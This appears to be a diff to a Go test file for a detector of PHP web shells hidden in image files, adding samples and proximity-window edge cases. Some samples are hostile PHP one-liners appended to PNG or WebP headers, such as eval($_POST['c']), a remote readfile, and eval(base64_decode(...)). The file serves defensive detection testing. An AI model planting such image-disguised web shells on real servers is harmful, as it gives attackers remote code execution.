@@ -103,6 +103,14 @@ include($datas);
 		"webp_appended_shell":       append(append([]byte("RIFF\x24\x00\x00\x00WEBPVP8 "), make([]byte, 16)...), []byte("<?php eval($_POST['c']);")...),
 		"png_remote_stream":         append(yaraPNG(t), []byte("<?php readfile('https://192.0.2.1/code');")...),
 		"png_file_write":            append(yaraPNG(t), []byte("<?php fwrite($handle, $payload);")...),
+		"png_request_input":         append(yaraPNG(t), []byte("<?php $_POST['value'];")...),
+		// Encoded payloads can put a long literal between the opener and the
+		// call while keeping the executable construct inside the rule's window.
+		"png_blob_then_eval": append(yaraPNG(t), []byte("<?php $d = '"+strings.Repeat("QUFB", 16_000)+"'; eval(base64_decode($d));")...),
+		// The proximity window starts after the opening tag, not at its first
+		// byte. Keep a construct at the inclusive boundary detectable.
+		"png_eval_at_proximity_boundary": append(yaraPNG(t),
+			[]byte("<?php "+strings.Repeat("A", (64<<10)-1)+" eval($payload);")...),
 	}
 	for name, sample := range cases {
 		t.Run(name, func(t *testing.T) {
@@ -129,6 +137,15 @@ func TestBackdoorPHPInImageIgnoresOrdinaryAssets(t *testing.T) {
 		"description_words":  append(yaraPNG(t), []byte("tEXtDescription\x00The system can include widgets. Usage: <?php the_widget('demo'); ?>")...),
 		"not_gif":            []byte("GIF8 documentation: <?php system($_GET['cmd']);"),
 		"invalid_php_opener": append(yaraPNG(t), []byte("<?php-example system('id')")...),
+		// A large photo: editor metadata near the start quotes prose that looks
+		// like a call, and compressed pixel data much later happens to contain
+		// a short echo tag. The two have nothing to do with each other.
+		"jpeg_metadata_words_before_random_opener": concatBytes(yaraJPEG(t),
+			[]byte("A subtractive two-color system (green and red)."), bytes.Repeat([]byte{0xA5}, 100<<10), []byte("<?=\xd7$\x86\x17")),
+		"jpeg_random_opener_far_before_words": concatBytes(yaraJPEG(t),
+			[]byte("<?=\xd7$\x86\x17"), bytes.Repeat([]byte{0xA5}, 70<<10), []byte("A subtractive two-color system (green and red).")),
+		"png_eval_beyond_proximity": append(yaraPNG(t),
+			[]byte("<?php "+strings.Repeat("A", (64<<10)+1)+" eval($payload);")...),
 	}
 	for name, sample := range cases {
 		t.Run(name, func(t *testing.T) {
@@ -137,6 +154,14 @@ func TestBackdoorPHPInImageIgnoresOrdinaryAssets(t *testing.T) {
 			}
 		})
 	}
+}
+
+func concatBytes(parts ...[]byte) []byte {
+	var out []byte
+	for _, p := range parts {
+		out = append(out, p...)
+	}
+	return out
 }
 
 func imageLoaderRules(t testing.TB) string {
